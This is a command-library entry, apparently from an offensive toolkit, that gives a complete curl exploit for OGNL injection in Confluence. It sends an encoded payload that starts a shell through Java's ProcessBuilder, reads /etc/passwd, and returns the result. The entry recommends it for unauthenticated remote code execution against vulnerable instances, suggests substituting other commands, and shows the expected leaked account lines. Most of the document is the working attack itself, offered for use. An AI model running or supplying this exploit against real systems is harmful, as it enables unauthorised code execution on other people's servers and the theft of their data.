---
id: cmd-uuid-123
data: >-
  curl -X POST
  'http://target.confluence.com/confluence/pages/doenterpagevariables.action' -H
  'Content-Type: application/x-www-form-urlencoded' --data-urlencode
  'queryString=aaaaaaaa\'+%2b{Class.forName(\'javax.script.ScriptEngineManager\').newInstance().getEngineByName(\'JavaScript\').eval(\'var+isWin+%3d+java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\")%3b+var+cmd+%3d+new+java.lang.String(\"cat
  /etc/passwd\")%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(\"cmd.exe\",+\"/c\",+cmd)%3b+}+else{p.command(\"bash\",+\"-c\",+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+\"\"%3b+var+output+%3d+\"\"%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}\')}+\''''
tags:
  - rce
  - web-exploit
  - ognl
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:42.271Z'
verified: false
validated: true
submitted: true
---
# curl-post-ognl-injection

## Command

```bash
curl -X POST 'http://target.confluence.com/confluence/pages/doenterpagevariables.action' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'queryString=aaaaaaaa\'+%2b{Class.forName(\'javax.script.ScriptEngineManager\').newInstance().getEngineByName(\'JavaScript\').eval(\'var+isWin+%3d+java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\")%3b+var+cmd+%3d+new+java.lang.String(\"cat /etc/passwd\")%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(\"cmd.exe\",+\"/c\",+cmd)%3b+}+else{p.command(\"bash\",+\"-c\",+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+\"\"%3b+var+output+%3d+\"\"%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}\')}+\''''
```

## Description

Sends a POST request to exploit OGNL injection in Confluence, executing arbitrary code to run OS commands and return output like /etc/passwd contents. Use when targeting vulnerable Confluence instances for unauthenticated RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `http://target.confluence.com/...` | Target endpoint URL | Yes |
| `-H 'Content-Type: ...'` | Sets form-encoded content type | Yes |
| `--data-urlencode 'queryString=...'` | Encoded OGNL payload for injection | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://target/confluence/pages/doenterpagevariables.action' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'queryString=...' > response.html
```

### Advanced Usage

Modify the cmd in payload for other commands, e.g., replace 'cat /etc/passwd' with 'whoami' for user enumeration.

```bash
curl ... --data-urlencode 'queryString=... (modified payload with whoami) ...'
```

## Expected Output

HTTP 200/500 response with body containing executed command output, e.g., user entries from /etc/passwd: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin'.

## Related

- [[Related Procedure|procedures/Exploit-OGNL-Injection-for-RCE-in-Confluence]]
